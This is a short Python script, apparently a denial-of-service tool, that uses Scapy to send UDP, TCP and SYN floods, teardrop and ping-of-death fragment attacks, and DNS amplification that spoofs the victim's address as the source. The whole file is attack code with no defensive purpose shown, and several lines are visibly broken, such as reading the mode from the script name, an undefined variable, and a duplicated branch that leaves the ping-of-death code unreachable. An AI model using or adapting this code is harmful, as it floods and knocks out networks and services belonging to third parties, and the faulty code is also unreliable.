from scapy.all import *
import sys

mode = sys.argv[0]
dstIP = sys.argv[1]
dstPort = sys.argv[2]
Interface = sys.argv[3]
n_loop = sys.argv[4]
rep = sys.argv[5]

payload = Raw(b"X"*1024)

if mode == "UDP":
    # UDP
    p = IP(dst=dstIP)/UDP(dport = dstPort)/payload
    send(p,loop = n_loop, count = rep, verbose = 0,iface=Interface)
elif mode == "TCP":
    #TCP
    p = IP(dst=dstIP) / TCP(sport=RandShort(), dport=dstPort, flags="S") / payload
    send(p,loop = n_loop, count = rep, verbose = 0, iface=Interface)
elif mode == "SYN":
    #SYN
    p = IP(dst='IP', id =1111, ttl=99)/TCP(sport=RandShort(),dport=dstPort, seq=12345,ack=1000,window=1000,flag="S",option=topt)
    send(p,loop = n_loop, count = rep, verbose = 0, iface=Interface)
elif mode == "TearDrop":
    #Tear drop
    offset=3
    p=IP(dst=dstIP)/UDP(dport = dstPort,flags="MF")/payload

    for r in range(0,rep):
        for l in range(0,n_loop):
            p.frag=offset
            offset+=20
            send(p, verbose=0,iface=Interface)
elif mode == "TearDrop":
    # Ping of Death
    send(fragment(IP(dst=dstIP)/ICMP())/('X'*60000),loop = n_loop, count = rep,  iface=Interface)
elif mode == "DNS":
    # DNS amplication
    dns_destination = ["ip1","ip2","ip3"]                                                              
    query_name = "exampe.com"                                                          
    query_type = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"] 

    for r in range(0,rep):
        for l in range(0,n_loop):
            for i in range(0,len(query_type)):
                for j in range(0, len(dns_destination)):

                    p= IP(src = dstIP, dst=dns_destination[j]) / UDP(dport = dstPort) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
                    send(p,verbose=False)
else :
    print("fail mode")
    exit(1)
